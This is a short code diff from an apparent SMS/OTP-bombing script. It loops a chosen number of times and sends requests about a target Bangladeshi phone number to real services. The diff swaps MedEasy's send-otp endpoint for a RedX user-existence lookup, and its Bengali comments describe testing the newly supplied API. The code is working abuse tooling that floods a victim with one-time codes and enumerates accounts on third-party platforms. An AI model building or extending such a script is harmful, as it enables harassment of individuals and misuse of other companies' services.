@@ -37,8 +37,8 @@ async function startProcess() {
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // শুধুমাত্র MedEasy API ব্যবহার করা হচ্ছে
-            await fetch(`https://api.medeasy.health/api/send-otp/+88${target}/`, { 
+            // আপনার দেওয়া নতুন RedX v4 API টি টেস্ট করার জন্য
+            await fetch(`https://api.redx.com.bd/v4/redx/does-user-exist?phoneNumber=88${target}`, { 
                 method: 'GET', 
                 mode: 'no-cors',
                 cache: 'no-store'
